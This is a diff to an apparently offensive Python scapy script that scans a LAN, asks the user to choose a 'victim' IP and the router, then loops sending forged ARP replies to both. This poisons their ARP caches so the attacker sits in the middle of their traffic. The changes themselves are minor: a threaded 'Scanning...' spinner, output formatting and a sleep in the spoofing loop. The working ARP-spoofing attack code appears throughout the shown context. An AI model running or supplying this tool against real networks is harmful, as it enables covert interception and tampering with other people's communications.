@@ -1,6 +1,7 @@
 from scapy.all import ARP, Ether, srp   
 import scapy.all as scap
 import os
+import threading as th
 import time
 import platform
 import ipaddress
@@ -32,15 +33,26 @@ def login():
         print("This is not a valid IP, try again")
         login()
 
-    for x in range (0,4):  
-        b = "Scanning" + "." * x
-        print (b, end="\r")
-        time.sleep(0.8)
     return target_ip
 
 def scan(target):
     global ip
     global mac
+    done = False
+
+    def animation():
+        where = 0
+        animation_symbol = "|/-\\|/-"
+        while not done:
+            print("Scanning...",animation_symbol[where], end="\r")
+            time.sleep(0.1)
+            where += 1
+            if where == len(animation_symbol):
+                where = 0
+
+    t = th.Thread(target=animation)
+    t.start()
+
     arp = ARP(pdst=target)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = ether/arp
@@ -52,6 +64,8 @@ def scan(target):
     for _, received in result:
         ip.append(received.psrc)
         mac.append(received.hwsrc)
+
+    done = True
 
     return ip, mac
     
@@ -75,7 +89,7 @@ def isGoodNetwork(target, ip, mac):
             return victim, router
     else:
         print("ips in the network" , ip)
-        print("macs in the network", mac)
+        print("macs in the network", mac,"\n")
         print("Select your target ip. (1, 2, 3)...")
         victim = input()
         print("Select router ip. (1, 2, 3)... (Usually ends by .254)")
@@ -103,3 +117,4 @@ while True:
     scap.send(arp_response, count = 1)
     arp_response = ARP(pdst=ip[int(router)-1], hwdst=mac[int(router)-1], psrc=ip[int(victim)-1])
     scap.send(arp_response, count = 1)
+    time.sleep(1)
